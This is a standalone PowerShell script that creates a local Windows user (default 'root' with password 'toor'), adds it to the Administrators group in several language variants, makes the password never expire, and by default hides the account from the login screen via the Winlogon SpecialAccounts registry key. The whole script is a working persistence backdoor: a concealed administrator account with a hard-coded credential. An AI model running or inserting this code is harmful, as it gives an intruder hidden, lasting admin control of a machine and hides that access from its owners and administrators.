param(
    [string]$Username = "root",
    [string]$Password = "toor",
    [switch]$HideUser = $true
)

function Add-AdminUser {
    param (
        [string]$Username,
        [string]$Password,
        [bool]$HideUser
    )
    
    try {
        # Create new user account
        $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        New-LocalUser -Name $Username -Password $SecurePassword -PasswordNeverExpires:$true -UserMayNotChangePassword:$true -ErrorAction Stop
        
        # Add to admin groups (handles different language versions of Windows)
        $Groups = @(
            "Administrators",
            "Administrator",
            "Administratoren"
        )
        
        foreach ($Group in $Groups) {
            try {
                Add-LocalGroupMember -Group $Group -Member $Username -ErrorAction SilentlyContinue
            } catch {
                Write-Output "Note: Could not add to group $Group (might not exist on this system)"
            }
        }
        
        # Hide user from login screen if requested
        if ($HideUser) {
            $RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            if (!(Test-Path $RegistryPath)) {
                New-Item -Path $RegistryPath -Force | Out-Null
            }
            New-ItemProperty -Path $RegistryPath -Name $Username -Value 0 -PropertyType DWord -Force | Out-Null
        }
        
        Write-Output "Successfully created admin user: $Username"
        
    } catch {
        Write-Warning "Failed to create user: $_"
        exit 1
    }
}

# Ensure we're running as admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Script must run with administrative privileges"
    exit 1
}

# Execute the user creation
Add-AdminUser -Username $Username -Password $Password -HideUser $HideUser
